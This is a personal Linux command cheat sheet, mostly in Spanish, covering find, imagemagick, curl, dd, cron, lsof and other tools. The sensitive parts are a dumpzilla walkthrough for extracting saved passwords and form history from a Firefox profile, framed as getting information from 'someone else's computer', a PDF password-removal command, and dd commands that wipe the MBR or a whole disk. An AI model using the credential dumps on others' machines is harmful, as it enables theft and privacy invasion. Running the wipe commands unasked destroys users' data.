find directorio/ -mmin -5 -type f

#### buscar los directorios mas pesados que tengan megas y gigas dentro de un directorio ####

find directorio/ -type d -exec du -sh {} \; | tail -n 10 | sort -hr | grep [gm]

#### este comando busca archivos que han sido modificados entre 10 y 20 minutos atras, +10 significa 10 minutos atras y -20 significa menos de 20 minutos atras, si no utilizamos "-" o "+" le estamos diciendo a find que busca ese minuto exactamente  - this command finds all files changed between 10 and 20 minutes ago, +10 means more than 10 minutes ago, and -20 means less than 20, if you do not use a plus or minus, it means that number exactly ####

find directorio/ -mmin +10 -mmin -20 -type f

#### podemos indicarle a find que busque en diferentes directorios asi: -xdev significa que find busque en el sistema de archivo en el que nos encontramos actualmente - you can list multiple arbitrary directories in which to search like this: - xdev limits the search to the filesystem you are in and will not enter any other mounted filesystems ####

find /etc /var /mnt /media -xdev -mmin -5 -type f

#### tambien podemos excluir directorios con el comando "-prune", "-prune -o" significa que no busque dentro de los directorios nombramos anteriormente ejemplo: - you can narrow your searches by excluding directories with the prune option. prune is a little weird; you have to think backwards. this example searches the whole filesystem except for the /proc and /sys pseudo-directories: ####

find directorio/ \( -name proc -o -name sys \) -prune -o -type f -mmin -1

#### para que find nos muestre dia, fecha, mes, ano y la hora de los archivos tenemos que darle el parametro "-printf "%ac\t%p\n"" asi: "-printf" significa "print format" es util para controlar el formato de la salida - the printf option is "print format." use printf when you want to control the formatting of your OUTPUT

find directorio/ -type f -printf "%ac\t%p\n"

#### buscamos diferentes formatos de archivo de la siguiente manerea: "-o" significa "o" this example searches the current directory for three different types of image files: ####

find directorio/ -name "*.png" -o -name "*.jpg" -o -name "*.gif" -type f

#### buscar archivos duplicados - find duplicates files in a couple of ways. this command checks md5 hashes: ####

find directorio/ -type f -exec md5sum '{}' ';' | sort | uniq --all-repeated=separate -w 24

#### lista archivos sin punto en el directoria actual usando regexp expresiones regulares con find ####

find -maxdepth 1 -regex ".*/[^./]*" -type f

#### visualizar todos los archivos del sistema con suid configurado ####

find directorio/ -perm -u+s

#### find and cp exluding file/directories

find . -type f -not -iname '*/not-from-here/*' -exec cp '{}' '/dest/{}' ';'

#############################################################################################################################################################################################

############################################################################################ locate #########################################################################################

#### locate

#### para busca los archivos que coincidan con la palabra mandril dentro de todo el sistema de archivo utilizando locate hariamos ####

locate mandril

#### "locate" es otro gran comando para buscar archivos en linux y es mucho mas rapido que "find" utiliza una base de datos que se la puede actualizar asi ####

updatedb   - locate



#############################################################################################################################################################################################

############################################################################################## gs ###########################################################################################

#### gs

#### unir varios pdf en uno solo ####

gs -q -dnopause -dbatch -sdevice=pdfwrite -soutputfile=salida.pdf entrada_1.pdf entrada_2.pdf

#### quitarle contrasena a un pdf ####

gs -q -dnopause -dbatch -sdevice=pdfwrite -soutputfile=unencrypted.pdf -c .setpdfwrite -f encrypted.pdf

#############################################################################################################################################################################################

########################################################################################### byzanz ##########################################################################################

#### byzanz

#### instalar y crear giftutoriales con byzanz ####

apt-get install byzanz ; byzanz-record -d 90 -x 0 -y 0 -w 1920 -h 1080 alarde.gif

-d 20 = eltiempo que nos tomara grabar en segundos 20
-x -y = las coordenanas a grabar. en el caso 0 porque grabe todo el escritorio
-w y -h = alto y ancho del gif
tutorial.gif= el nombre del fig 



#############################################################################################################################################################################################

########################################################################################### history #########################################################################################

#### history

#### listar los comandos que mas usas ####

history | awk '{a[$2]++}end{for(i in a){print a[i] " " i}}' | sort -rn | head



#############################################################################################################################################################################################

########################################################################################### firefox #########################################################################################

#### firefox

#### extraer informacion de los archivos sqlite de firefox ####

cd /home/curiousx/.mozilla/firefox/ && sqlite3 `cat profiles.ini | grep path | awk -f= '{print $2}'`/formhistory.sqlite "select * from moz_formhistory" && cd .. > /dev/null

#### iniciar navegador firefox utilizando las librerias vdpau para la aceleracion grafica ####

vdpau_driver=va_gl firefox

#### utilizar peperflash (flash de chrome) en firefox ####

# agregamos el ppa de webup8d e instalamos el waper #

sudo apt-get remove flashplugin-* ; sudo apt-get install pepperflashplugin-nonfree ; sudo add-apt-repository ppa:nilarimogard/webupd8 ; sudo apt-get update ; sudo apt-get install freshplayerplugin


#### firefox forensis

# Download the script from here: http://www.dumpzilla.org/. #

# Make it executable: #

chmod +x dumpzilla.py

# Then you may begin to analyse a Firefox instance. #

# This will extract all passwords: #

python dumpzilla.py $HOME.mozilla/firefox/9u1fri1y.default --Passwords   - python dumpzilla.py $HOME.mozilla/firefox/*.default/ --Passwords

# This is how to dump all Bookmarks: #

python dumpzilla.py $HOME.mozilla/firefox/9u1fri1y.default --Bookmarks   - python dumpzilla.py $HOME.mozilla/firefox/*.default/ --Bookmarks

# And to dump their download history: The downloads history will also include all directories downloaded to as well, that will be printed at the end of the output #

python dumpzilla.py $HOME.mozilla/firefox/9u1fri1y.default --Downloads   - python dumpzilla.py $HOME.mozilla/firefox/*.default/ --Downloads

# Dump the targets forms history, this will get their Google search information #

python dumpzilla.py $HOME.mozilla/firefox/9u1fri1y.default --Forms   - $HOME.mozilla/firefox/*.default/ --Forms

# Dump the thumbnails #

python dumpzilla.py $HOME.mozilla/firefox/9u1fri1y.default/ --Thumbnails <folder>   - python dumpzilla.py $HOME.mozilla/firefox/*.default/ --Thumbnails thumbs/

This script therefore is a very useful way to get information from someone else's computer. This will also work on Windows, but it would be good to use a Live CD and mount the target system read-only and then begin a forensic examination of the machine. But this really does work when you need it to.

#### instalar plugin icedtea para correr juegos o programas escritos en java embebidos en el navegador ####

sudo apt-get install icedtea-plugin


#############################################################################################################################################################################################

######################################################################################### imagemagick #######################################################################################

#### imagemagick #### convert #### montage #### import #### animate #### identify #### display

#### tomamos sacamos una captura de pantalla indicando con el mouse la dimension a capturar ####

import filename.png

#### para capturar una sola ventana incluida su decoracion: ####

import -border filename.png

#### captura de pantalla en cualquier formato ####

import -window root pantalla.ps (tambien jpg,png,gif,etc)

#### screenshot capturas de pantalla con import y sleep ####

sleep 5 ; import -window root leanhack.png

#### crear una imagen desde la salida de algun comando ####

ifconfig | convert -background green -fill white -font courier -pointsize 12 label:@- ifconfig.png

#### Reduce weight in images

convert -quality 90 image.png output_image.png

#### escalar imagenes darle mas resolucion ####

convert -geometry 1200x800 archivo_original.jpg archivo_salida.jpg

#### cambiar tamano de imagenes desde la linea de comandos ####

convert -sample 30%x30% input_image.png output_image.png   -   esto cambia el tamano de una imagen a un 30% manteniendo su relacion de aspecto.

#### convertir la imagen .ppm creada con convert a png ####

convert image.ppm output.png

#### crear un favicon ####

convert -colors 256 -resize 16x16 imagen.png favicon.ico

#### crear un gif animado con varios jpg. ####

convert -delay 15 imag1.jpg imag2.jpg imag3.jpg remero.gif

#### extraer los fotogramas de un gif animado ####

convert remero.gif -adjoin remeros.jpg

#### hacer tomar un screenshot captura de pantalla de una tty con fbcat ####

fbcat > image.ppm

#### crear mosaico de fotos/screenshot/wallpapers desde la termial ####

montage -geometry +0+0 -tile 2x2 entradas.jpg salida.jpg

#### unir imagenes con montage de imagemagic ####

#### orizontal ####

montage 1.png 2.png 3.png 4.png -tile 4x1 -geometry +0+0 -title horizontal horizontal.png

#### vertical ####

montage 1.png 2.png 3.png 4.png -tile 1x4 -geometry +0+0 -title vertical vertical.png

#### mozaico ####

montage *.png -tile 2x2 cuadrado.png

#### para visualizar .gif ####

animate remero.gif

#### ver las propiedades de una imagen ####

identify imagen.gif

#### cambiar el formato de varias imagenes. ####

mogrify -format jpg *.ppm (convierte a .jpg todas las imagenes .ppm)

#### crear miniaturas de varias imagenes. ####

mogrify -format png -sample 20%x20% *.jpg

#### visualizar imagenes (incluidas las xwd). ####

display imagen.xwd




#### anadir texto a una imagen : ####
                                                     columna_     _fila
                                                               |   |
convert -font courier -fill yellow -pointsize 25 -draw \'text 100,250 remeros\' imagen.jpg imagen_con_txt.jpg
         -----         -----         ------------  ------------------ -------
           |             |                |        posicion del texto    |
   v             v                v                              v
         fuente   color de fuente  tamano de la fuente                |texto
                                                                      |si este tuviese mas de una palabra
                                                                      |habria que ponerlo entre dobles comillas

#############################################################################################################################################################################################

############################################################################################# curl ##########################################################################################

#### curl

#### obtener datos climaticos, meteorologicos ####

curl wttr.in

#### indicar "user agent" en curl ####

curl -a "useragentstring"

#### utilizar curl atraves de tor ####

curl --socks5-hostname localhost:8118

#### expandir links acortados mostrar el verdadero origen o hacia donde nos lleva el link acortado ####

expandurl() { curl -sil $1 | grep ^location; }

funcion:  turl(){ curl --socks5-hostname localhost:9050 $@ ; }

#### establecer un limite en la velosidad de descargas desde curl ####

curl -o --limit-rate 500k $url

#### informacion coneccion internet ####

curl ifconfig.me/ip   // direccion ip
curl ifconfig.me/host // servidor remoto
curl ifconfig.me/ua   // user agent
curl ifconfig.me/port // puerto

#### enviar mensajes a kodi con curl ####

curl -x post -h "content-type: application/json" -d '{"jsonrpc":"2.0","method":"gui.shownotification","params":{"title":"this is the title of the message","message":"this is the body of the message"},"id":1}' http://i3c.pla.lcl:8080/jsonrpc

#### subir archivo a servidor ftp ####

curl -u usuario:password -t archivo-backup.7z ftp://192.168.128.2/server_backups/

#### obtener status code http response code de un servidor ####

curl --write-out %{http_code} --silent --OUTPUT /dev/null localhost



#############################################################################################################################################################################################

########################################################################################## virtualbox #######################################################################################

#### virtualbox

#### instalar guest additions ####

#### desinstalamos cualquier cosa que hayamos hecho antes ####

/opt/VBoxGuestAdditions-4.3.6/uninstall.sh

#### instalamos guest additions ####

sudo apt-get install virtualbox-guest-additions-iso

#### activamos guest additions desde drivers adicionales ####

software-properties-gtk --open-tab=4

#### cambiar el tamano de un disco en virtualbox ####

vboxmanage modifyhd [disco.vdi] --resize [nuevo tamano en mb]

#### desinstala vmware player ####

/usr/bin/vmware-installer -u vmware-player

#### convertir .vmdk (imagen de maquina virtual para vm ware) para usar la imagen en virtualbox ####

aptitude install qemu

qemu-img convert /tmp/metasploitable/metasploitable.vmdk metasploitable.bin

vboxmanage convertdd metasploitable.bin metasploitable.vdi


#############################################################################################################################################################################################

############################################################################################# dd ############################################################################################

#### dd

#### al comando dd siempre le podemos hacer un pipe a "pv" para que nos muestre el funcionamiento en tiempo real por ejemplo ####

dd if=/dev/hda | pv | dd of=/dev/sdb bs=2048

#### la sintaxis mas basica, seria esta: ####

dd if=[origen] of=[destino]

#### por lo que si quisieramos clonar un disco duro tipo ide: ####

dd if=/dev/hda of=/dev/sdb bs=2048

#### para discos sata ####

dd if=/dev/sda of=/dev/sdb bs=2048   - nota: con bs=1m, estamos diciendo que tanto la lectura como la escritura se haga en bloques de 1 megabyte (menos, seria mas lento pero mas seguro, y con mas nos arriesgamos a perder datos. hay que tener en cuenta que de esta forma grabaras el disco "tal cual", mbr, tabla de particiones, espacio vacio, etc., por lo que solo podras grabar en un disco del mismo o mayor tamano

#### grabariamos solo la primera particion del disco de origen en el de destino. ####

dd if=/dev/sda1 of=/dev/sdb bs=2048

#### crear una imagen del disco duro, puede ser bin o iso (a partir de ahora utilizare nuestro home como ejemplo). como root: ####

dd if=/dev/hda of=/home/hda.bin

#### crear una imagen del disco comprimida, (podemos utilizar gzip, bzip o bzip2.) ####

dd if=/dev/hda | gzip > /home/hda.bin.gz

#### crea una imagen de un cd: ####

dd if=/dev/cdrom of=/home/imagendecd.iso

#### copiar el master boot record: ####

dd if=/dev/hda of=mbr count=1 bs=512

#### para restaurar el mbr: ####

dd if=mbr of=/dev/hda

#### copiar el volume boot sector (vbs): ####

dd if=/dev/hda of=/home/sector_arranque_hda count=1 bs=512

#### para restaurar el vbs: ####

dd if=/home/sector_arranque_hda of=/dev/hda

#### recuperar un dvd rayado: ####

dd if=/dev/cdrom of=/home/dvd_recuperado.iso conv=noerror,sync

#### esto no recupera todo el dvd, en este caso, solo los sectores legibles. sirve tambien para discos duros defectuosos. la opcion noerror sirve para obviar los errores de lectura en cualquier situacion. otro ejemplo seria: #### 

dd conv=noerror if=/dev/hda of=~/home/imagen_disco_con_errores.iso    - grabariamos con ello una imagen del disco duro en nuestro home saltandonos los errores del disco (muy util para discos que se estan muriendo) 

#### limpia nuestro mbr y la tabla de particiones: ####

dd if=/dev/zero of=/dev/hda bs=512 count=1

#### limpia el mbr pero no toca la tabla de particiones (muy util para borrar el grub sin perder datos en las particiones): ####

dd if=/dev/zero of=/dev/hda bs=446 count=1

#### al borde de la paranoia... convierte todas las letras en mayusculas: ####

dd if=miarchivo of=miarchivo conv=ucase

#### convertir todas las letras en minusculas ####

dd if=archivo.txt of=minusculas.txt conv=lcase

#### dd con barra de progreso ####

dd if=/dev/sdc bs=4096 | pv -s 2g | dd bs=4096 of=~/usb_black_backup.img

#### borrar un disco completo con formato y todo ####

dd if=/dev/null of=/dev/sda

#############################################################################################################################################################################################

############################################################################################ sox ############################################################################################

#### sox

#### stream sonidos del sistema sobre rtmp nota: sox (sound exchange) can capture the system audio be it a browser playing youtube or from hardware mic and can pipe it to ffmpeg which encodes it into flv and send it over rtmp ####

sox -d -p | ffmpeg -i pipe:0 -f flv -preset ultrafast -tune zerolatency rtmp://localhost/live/livestream



#############################################################################################################################################################################################

############################################################################################ melt ###########################################################################################

#### melt

#### transision entre dos videos ####

melt a.mp4 out=49 -track -blank 24 b.mp4 -transition luma in=25 out=49 a_track=0 b_track=1 -consumer avformat:out.mp4

#### fade in y fade out en los primeros y ultimos 25 frames de un video #### 

melt colour:black out=24 vid.mp4 -mix 25 -mixer luma colour:black out=24 -mix 25 -mixer luma -consumer avformat:out.mp4



#############################################################################################################################################################################################

########################################################################################### mailx ###########################################################################################

#### mailx

#### enviar email ####

true | mailx -n -a mytext.txt -r my@mail.com -s log -s smtp=mail.com -s smtp-auth-user=myuser -s smtp-auth-password=mypassword friend@mail.com



#############################################################################################################################################################################################

############################################################################################ iconv ##########################################################################################

#### iconv

#### sintaxis ####

iconv -f fromencoding -t toencoding inputfile > outputfile

#### ver la lista de codificado disponibles ####

iconv -l

#### remover caracteres de acentos ####

iconv -f utf8 -t ascii//translit archivo_entrada.txt > archivo_salida.txt

#### convertir iso 8859 a utf8 ####

iconv -f ISO_8859-1 -t UTF-8 archivo > archivo_salida


#############################################################################################################################################################################################

########################################################################################## dos2unix #########################################################################################

#### dos2unix

#### convertir caracteres de un archivos a formato de caracteres unix ####

dos2unix -c ascii archivo.txt -c iso archivo.txt




#############################################################################################################################################################################################

############################################################################################ cron  ##########################################################################################

#### cron

#### Desactivar tareas programadas mediante cron ####

En ocasiones podemos querer desactivar una tarea programada mediante cron almacenada en cualquiera de los siguientes directorios:

    /etc/cron.hourly.
    /etc/cron.daily.
    /etc/cron.weekly.
    /etc/cron.monthly

Como siempre, hay muchas formas de lograr el mismo resultado, pero en este post os voy a contar la que a mi mas me gusta: "Aprovechar que las tareas ubicadas en los directorios mencionados anteriormente se ejecutan mediante run-parts, y run-parts no ejecuta tareas que tengan un punto en su nombre". 

#### De este modo, si por ejemplo, quisiera desactivar la tarea diaria /etc/cron.daily/nightly-pkgsync, lo unico que tendria que hacer seria renombrar el fichero: ####

# mv /etc/cron.daily/nightly-pkgsync /etc/cron.daily/nightly-pkgsync.disabled


#### Y, al ponerle en el nombre .disabled, me resultaria muy facil buscar tareas desactivadas con tan solo ejecutar: ####

# find /etc/cron.* -name "*disabled"   - Asi, si quisiera volver a activar una tarea desactivada, tan solo tendria que volver a renombrarla quitando del nombre .disabled


#### Si quereis comprobar que tareas programadas se van a ejecutar mediante cron, podeis usar el comando: ####

# run-parts --test /etc/cron.daily

Si habeis desactivado alguna, anadiendo a su nombre .disabled, no aparecera en la lista. 


#############################################################################################################################################################################################

########################################################################################### crontab #########################################################################################

#### crontab

#### syntax

*     *     *   *    *        command to be executed
-     -     -   -    -
|     |     |   |    |
|     |     |   |    +----- day of week (0 - 6) (Sunday=0)
|     |     |   +---------- month (1 - 12)
|     |     +-------------- day of        month (1 - 31)
|     +-------------------- hour (0 - 23)
+-------------------------- min (0 - 59)

# Minute (hold values between 0-59)
# Hour (hold values between 0-23)
# Day of Month (hold values between 1-31)
# Month of the year (hold values between 1-12 or Jan-Dec, you can use first three letters of each month’s name i.e Jan or Jun.)
# Day of week (hold values between 0-6 or Sun-Sat, Here also you can use first three letters of each day’s name i.e Sun or Wed. )
# Command


#### buscar si algun usuario en el sistema tiene trabajos automatizados con crontab ####

for user in `cat /etc/passwd | grep bash | awk -f: {'print $1'}`; do crontab -u $user -l; done

for user in `awk -f: {'print $1'} /etc/passwd`; do crontab -u $user -l; done

#### para ver las entradas programadas que tengamos en cron hacemos ####

crontab -u usuario -l

#### para programa que se realice una tarea automaticamente cada 10 minutos usando cron editamos el archivo de configuracion /etc/crontab y agregamos ####

*/10 * * * * /home/usuario/scripts.sh



Crontab is a command is used to execute the list of commands at scheduled time.It is file to store the scheduled commands too.

Crontab is used by most of the time by System Administrators to schedule the regular server Activities like Backup and Running scheduled jobs.

Crontab is daemon process which runs in the background always to check the crontab schedule.

I believe in giving enough Examples.So,let’s go by few examples before we jump on to the actual Crontab syntax’s

Example 1:

we can run Specific Program at Early morning 5 AM in day.

Example 2:

We can run Specific Program at Night 11:59 PM.

Example 3:

Some times,we have to run multiple programs/processes at a time at exact second.

It is difficult to do the above activities without without Crontab.Crontab can be maintained at each user level.(i.e) Every user can have it’s own individual Crontab File or Setting.

All the user Crontab files will be stored in “/var/spool” path.

Usage 1: How to See the Existing Crontab for the logged in user.?

crontab -l

It displays the content as below.

[[email protected]]# crontab -l

no crontab for root

It seems,we don’t have crontab contents for the user – user1 on machine name called “LinuxMachine”.

Usage 2: How to add the contents to crontab ?

[[email protected]]# crontab -e

Usage 3: How to remove the contents from crontab?

[[email protected]]# crontab -r

Usage 4:How to remove the contents from crontab with yes or no prompt.?

[[email protected]]# crontab -i

Usage 5:In Crontab,each Line is one Scheduled task.Each line should have six Fields.

MIN HOUR DOM MON DOW CMD

    MIN – 0-59 in Value
    HOUR – 0 to 23 in Value ( Remember it is always in 24 hour format)
    DOM => Day of the Month – 1 to 31 in Value
    MON => Which Month it is. – 1 to 12 in Value
    DOW => Day of the Week.- 0 to 6 in Value
    CMD => Which command/Process you want to schedule with path of the executable.

USAGE 6:How to run Backup Job in the morning At 20th December at 5:15 AM using Crontab.?

15 05 20 12 * /home/user1/backupJob.sh

15 -> 15 Minutes

05-> 05th Hour.

20-> 20th Day.

12-> 12th Month

The above Entry in the Crontab will run the script – backupJob.sh at 5:15 AM on 20th December.

USAGE 7:How to run DailyJob Script in the morning Daily at 5 AM?

0 5 * * * /home/user1/MyDailyScript.sh

0 -> Oth Minute.

5 -> 5th Hour

* ->Every Day

* -> Every Month

USAGE 8:How to run the script  every 12am and 12pm on the 1st day of every 2nd month?(i,e Alternate month) ?

0 0,12 1 */2 * /home/user1/MyScript.sh

0,12 -> Means 12th hour and 24th hour.

*/2 -> Every Alternate month

USAGE 9:How to run the script every 3am on the 1st through the 10th of each month ?

0 3 1-10 * * /home/user1/MyScript.sh

1-10 -> means from 1st to 10th Date.

USAGE 10:How to run the script every month at 4am on Mondays, and on the days between 15-21.

0 5 15-21 * 1 /home/user1/MyScript.sh

1-> means monday

15-21 means days

USAGE 11:How to run the script for every hour between 1 am to 8 am that to daily.

0 01-08 * * * /home/user1/MyScript.h

USAGE 12:How to run the script for every Minute,daily.

0 * * * * /home/user1/MyScript.h

USAGE 13:How to run the script for every Second,daily.

Note: We can not schedule.Because minimum time we have to mention is 1 minute.

USAGE 14:How to run the script for every 30 Minutes.

0/30 * * * * /home/user1/MyScript.h

USAGE 15:How to run the script yearly once at first minute of the year.

@yearly /home/user1/MyScript.h

USAGE 16:How to run the script monthly once at first minute of the month.

@monthly /home/user1/MyScript.h

USAGE 17:How to run the script Daily once at first minute of the day.

@daily /home/user1/MyScript.h

USAGE 18:How to run the script After system Reboot.

@reboot /home/user1/MyScript.h

USAGE 19:How to Install the crontab from text file

Crontab crontab.txt

Note:Suppose ,if you have backup of crontab contents in the crontab.txt.We can install directly from the previous backup using above command.

USAGE 20:How to run the script At 10:30 P.M., every weekday.

30 22 * * Mon,Tue,Wed,Thu,Fri /usr/local/bin/backup

### Reiniciar servidor urban terror:

sudo crontab -e

0 6 * * * /sbin/shutdown -r +5


#### tecmint:

In this article we are going to review and see how we can schedule and run tasks in the background automatically at regular intervals using Crontab command. Dealing a frequent job manually is a daunting task for system 
administrator. Such process can be schedule and run automatically in the background without human intervene using cron daemon in Linux or Unix-like operating system.

For instance, you can automate process like backup, schedule updates and synchronization of files and many more. Cron is a daemon to run schedule tasks. Cron wakes up every minute and checks schedule tasks in crontable. Crontab 
(CRON TABle) is a table where we can schedule such kind of repeated tasks.

Tips: Each user can have their own crontab to create, modify and delete tasks. By default cron is enable to users, however we can restrict adding entry in /etc/cron.deny file.
Linux Cron ExamplesLinux Cron Examples

11 Cron Command Examples in Linux


Crontab file consists of command per line and have six fields actually and separated either of space or tab. The beginning five fields represent time to run tasks and last field is for command.

    Minute (hold values between 0-59)
    Hour (hold values between 0-23)
    Day of Month (hold values between 1-31)
    Month of the year (hold values between 1-12 or Jan-Dec, you can use first three letters of each month’s name i.e Jan or Jun.)
    Day of week (hold values between 0-6 or Sun-Sat, Here also you can use first three letters of each day’s name i.e Sun or Wed. )
    Command

1. List Crontab Entries

List or manage the task with crontab command with -l option for current user.

# crontab -l
00 10 * * * /bin/ls >/ls.txt

2. Edit Crontab Entries

To edit crontab entry, use -e option as shown below. In the below example will open schedule jobs in VI editor. Make a necessary changes and quit pressing :wq keys which saves the setting automatically.

# crontab -e

3. List Scheduled Cron Jobs

To list scheduled jobs of a particular user called tecmint using option as -u (User) and -l (List).

# crontab -u tecmint -l
no crontab for tecmint

Note: Only root user have complete privileges to see other users crontab entry. Normal user can’t view it others.
4. Remove Crontab Entry

Caution: Crontab with -r parameter will remove complete scheduled jobs without confirmation from crontab. Use -i option before deleting user’s crontab.

# crontab -r

5. Prompt Before Deleting Crontab

crontab with -i option will prompt you confirmation from user before deleting user’s crontab.

# crontab -i -r
crontab: really delete root's crontab?

6. Allowed special character (*, -, /, ?, #)

    Asterik(*) – Match all values in the field or any possible value.
    Hyphen(-) – To define range.
    Slash (/) – 1st field /10 meaning every ten minute or increment of range.
    Comma (,) – To separate items.

7. System Wide Cron Schedule

System administrator can use predefine cron directory as shown below.

    /etc/cron.d
    /etc/cron.daily
    /etc/cron.hourly
    /etc/cron.monthly
    /etc/cron.weekly

8. Schedule a Jobs for Specific Time

The below jobs delete empty files and directory from /tmp at 12:30 am daily. You need to mention user name to perform crontab command. In below example root user is performing cron job.

# crontab -e
30 0 * * *   root   find /tmp -type f -empty -delete

9. Special Strings for Common Schedule
Strings   Meanings
@reboot   Command will run when the system reboot.
@daily    Once per day or may use @midnight.
@weekly   Once per week.
@yearly   Once per year. we can use @annually keyword also.

Need to replace five fields of cron command with keyword if you want to use the same.
10. Multiple Commands with Double amper-sand(&&)

In below example command1 and command2 run daily.

# crontab -e
@daily <command1> && <command2>

11. Disable Email Notification.

By default cron send mail to user account executing cronjob. If you want to disable it add your cron job similar to below example. Using >/dev/null 2>&1 option at the end of the file will redirect all the output of the cron 
results under /dev/null.

[root@tecmint ~]# crontab -e
* * * * * >/dev/null 2>&1

conclusion: Automation of tasks may help us to perform our task better ways, error free and efficiently. You may refer manual page of crontab for more information typing ‘man crontab‘ command in your terminal.


#############################################################################################################################################################################################

############################################################################################## at ###########################################################################################

#### at

#### un ejemplo de su sintaxis ####

at -f script 15:23

#### ejecutar un script a una hora y/o fecha ####

at [-f script] [tiempo]

#### formas de indicar el tiempo: ####

#### hoy a las 15:23 ####

at -f script 15:23

#### el 01.23.06 a las 15:23 ####

at -f script 15:23 01.23.06

#### dentro de 23 minutos, puede ser minutes, hours, days, weeks ####

at -f script now + 23 minutes

#### Esta forma nos abre un promp interactivo. ####

at [tiempo]

#### abre el promp de at ####

at 15:00

#### ingresamos el comando/os ####

at > comando

#### salimos de at ####

ctrl+d

#### muestra, numeradas, la lista de tareas programadas ####

atq

#### eliminara una tarea identificada por su n? ####

atrm n?

#### como todo comando en linux a "at" tambien podemos darle como entrada una tuberia pipe ####

echo 'wget -c www.example.com/files.iso' | at 09:00



#############################################################################################################################################################################################

############################################################################################ batch ##########################################################################################

#### batch

#### batch se emplea de las mismas formas que at,solo que en este caso, el script o comando se ejecutara solo si la media de carga de la cpu es inferior al 80%

5.c.-disco duro

nomenclatura de dispositivos

 -------------------------------------------------------
| nomenclatura de discos en linux|    ide    |   scsi   |
| -------------------------------|-----------|----------|
|  disco maestro del primer bus  | /dev/hda  | /dev/sda |
|  disco esclavo del primer bus  | /dev/hdb  | /dev/sdb |
|  disco maestro del segundo bus | /dev/hdc  | /dev/sdc |
|  disco esclavo del segundo bus | /dev/hdd  | /dev/sdd |
-------------------------------------------------------

designacion de particiones

 ----------------------------------------
| disco /dev/hda  |primarias | logicas   |
| ----------------|----------|-----------|
| 1?  particion   |/dev/hda1 | /dev/hda5 |
| 2?  particion   |/dev/hda2 | /dev/hda6 |
| 3?  particion   |/dev/hda3 | /dev/hda7 |
| 4?  particion   |/dev/hda4 | /dev/hda8 |
 ----------------------------------------



#############################################################################################################################################################################################

########################################################################################### openssl #########################################################################################

#### openssl

#### crifrar encodear en base64 con el simpbolo = ####

echo "encode me" | openssl enc -base64

#### crifrar encodear en base64 sin el simpbolo = ####

echo -n "encode me" | openssl enc -base64

#### descifrar base64 ####

echo "zw5jb2rlig1lcg==" | openssl enc -base64 -d

#### cifrar archivos utilizando opensslcon cifrado aes de 256 bits ####

openssl aes-256-cbc -salt -in secrets.txt -out secrets.txt.enc

#### descifrar archivos utilizando opensslcon cifrado aes de 256 bits ####

openssl aes-256-cbc -d -in secrets.txt.enc -out secrets.txt.new

#### comando iniciar xcreensaver al inicio ####



#############################################################################################################################################################################################

############################################################################################ lsof ###########################################################################################

#### lsof

#### para ver los archivos abiertos por un proceso ####

sudo lsof -c proceso

#### lista los procesos que estan usando mi directorio ####

sudo lsof +d $HOME   - lsof +d carpeta/

#### muestra que proceso se encuentra detras del puerto 60627 (aunque este a la escucha) ####

sudo lsof -i :60627

#### listar coneccion de red establesidas con el comando lsof ####

sudo lsof -i -n | grep ESTABLISHED

#### obtener informacion detallada de un programa con lsof ####

sudo lsof -o -p $PID   - lsof -o -p 2042

#### listar que aplicaciones tienen conexiones abiertas y que puertos utiliza numericamente no dns ####

sudo lsof -i -n


#### javarevisted

1) How to list all open files by all process

$ lsof

Simply running lsof without any argument print all opened file and process. This is not particularly useful 
but a good starting point.

2) How to list all process which has opened a file

$ lsof /home/someuser/somefile

will list all the process which has opened this file. you can see the command, PID, user and full file path to 
find out the process.

3) How to find all opened files by a user 
You can use lsof -u command to list all opened file by a user as shown below

$ lsof -u username

You can provide comma separated list of users to find list of open files by multiple users as shown below

$ lsof -u user1,user2,user3

You can do the same by providing -u option multiple times :

$ lsof -u user1 -u user2

Here is a summary of all 10 examples of lsof command in UNIX:

lsof command example to find all process listening on a port

4) How to list all files opened by a particular command
You can use lsof -c option to provide name of command and list down all the files opened by that command, for 
example, to list all file opened by java process, you can do this :

$ lsof -c java

This is better than using grep for filtering, as instead of writing lsof | grep java, you can just write lsof 
-c java.

You can also find all files opened by apache which runs as httpd as shown below :

lsof -c httpd

Just like multiple users, you can also combine multiple processes name to list down files hold by them e.g.

$ lsof -c java -c httpd

5) How to find all files opened by a particular user and command
You can combine users and process name in one lsof command to list down all the files opened by a particular 
process or a particular user as shown below :

$ lsof -u root -c java

This will list all files opened or hold by root user + all files opened by the java process. See  The Linux 
Command Line: A Complete Introduction, a

Linux lsof command Example

6) How to find files opened by USER and process
Like previous option, you can also combine user and process by using lsof option '-a'. This is like AND 
logical operator and will only list files, which matches both options e.g.

$ lsof -a -u root - c java

will only list files opened by java process which is running under root user

7) lsof with negation operator
Similar to AND and OR operator used earlier, you can also use negation operator with lsof command e.g.

$ lsof - u ^root

will list all files opened by all user except root

8) How to list all open files by a process using PID
As I told, I mostly use lsof command to find all files opened by a particular process. In order to do that 
sometimes, I usually use grep command to filter lsof output by PID, but you can also use lsof -p option to do 
the same, as shown below :

$ lsof -p 17783

will list all files opened by the process with PID 17783.

List users and processes, you can also supply multiple PIDs to find files opened by multiple processes e.g. :

$ lsof -p 17783,17754,17984

will list all files opened by the process with PIDs 17783,17754,17984. You can also see the Practical Guide to 
Linux Commands, Editors, and Shell Programming 3rd Edition by Mark G. Sobell to learn more about how to find a 
process in UNIX.

How to use lsof command in UNIX and Linux

9) How to list all network connection
You can use lsof - i option to find all open network connections which is nothing but open internet sockets 
(TCP and UDP), for example

$ lsof -i 

You can further find all TPC connection by using tcp option as shown below :

$ lsof -i tcp

Similarly, to find all open udp connections you can do :

$ lsof -i udp

will list all process with open internet sockets.

10) How to find which process is using a port 
Though you can do this with netstat command as well, you would be surprised to know that you can find all 
process using a particular TCP or UDP port using lsof command. For example :

$ lsof -i :19500 

will find the process which is using TCP or UDP port 19500

You can even names defined in etc/services instead of port number e.g.

$ lsof -i :smtp

will print process using the smtp port.

You can also combine tcp and udp with port to do more specific search e.g. to find all process in UNIX which 
are uses tcp port number 19600 you can do following :

$ lsof -i tcp:19600 

and to find all process which is using UDP port 17600 you can use

$ lsof -i udp:17600

That's all about 10 examples of lsof command in UNIX and Linux. As I said, it's incredibly useful to find the 
list of files opened by a particular process or to find all the process which holds a lock on a file. Since 
almost everything is a file in UNIX, you can use lsof to find out open socket, directory, symbolic link, 
internet socket and many others. You can also see lsof man page for full documentation and more options.

#############################################################################################################################################################################################

############################################################################################ lftp ###########################################################################################

#### lftp

#### verificar comprobar velosidad de descarga ####

lftp -e 'pget http://server_remoto/archivo_remoto.extension; exit; '  (instalar lftp y iperf)



#############################################################################################################################################################################################

########################################################################################### python ##########################################################################################

#### python

#### obtener una lista de proxys script ####

#!/usr/bin/env python
import pycrawler
import sys
